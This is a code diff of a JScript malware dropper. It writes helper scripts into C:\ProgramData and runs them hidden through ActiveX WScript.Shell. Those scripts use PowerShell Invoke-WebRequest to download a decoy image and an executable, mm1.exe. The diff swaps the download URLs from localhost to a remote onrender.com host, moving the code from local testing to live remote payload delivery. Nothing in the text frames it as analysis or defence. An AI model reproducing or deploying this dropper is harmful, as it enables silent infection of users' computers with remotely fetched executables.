@@ -34,7 +34,7 @@
     var x = new ActiveXObject("Scripting.FileSystemObject");
     if (1 || !p.FileExists("C://ProgramData//8292.png")) { // need to remove 1
       var o = p.CreateTextFile("C://ProgramData//kohl.js", 2 , true); // 2=true=overwrite, true=unicode
-      o.writeline("var shell = new ActiveXObject('WScript.shell');var exec = shell.run('cmd.exe /c powershell.exe /c Invoke-WebRequest -OutFile C:\\\\ProgramData\\\\8292.png http://localhost:3000/8292.png',0,true);");o.Close();
+      o.writeline("var shell = new ActiveXObject('WScript.shell');var exec = shell.run('cmd.exe /c powershell.exe /c Invoke-WebRequest -OutFile C:\\\\ProgramData\\\\8292.png https://cti-1dir.onrender.com/news',0,true);");o.Close();
       shell.run("C://ProgramData//kohl.js", 1);
       // {8292.png and kohl.js in ProgramData}
       var w = p.CreateTextFile("C://ProgramData//kohlw.js", 2, true);
@@ -45,7 +45,7 @@
       // {8292.png and kohl.js in ProgramData amd 8292.png is opened and dir'dvixm' in ProgramData}
       // var shell = new ActiveXObject('WScript.Shell');
       var h = p.CreateTextFile("C://ProgramData//update.js", 2, true);
-      h.writeline("var shell = new ActiveXObject('WScript.Shell');WScript.Sleep(100);var exec = shell.run('C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe /c Invoke-WebRequest -OutFile C:\\\\ProgramData\\\\dvixm\\\\mm1.exe http://localhost:3000/mm1.exe',0 , true);");
+      h.writeline("var shell = new ActiveXObject('WScript.Shell');WScript.Sleep(100);var exec = shell.run('C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe /c Invoke-WebRequest -OutFile C:\\\\ProgramData\\\\dvixm\\\\mm1.exe https://cti-1dir.onrender.com/mm1',0 , true);");
       h.Close();shell.run("C://ProgramData//update.js", 1);
       // {8292.png and kohl.js in ProgramData amd 8292.png is opened and dir'dvixm', and mm1.exe in ProgramData }
       
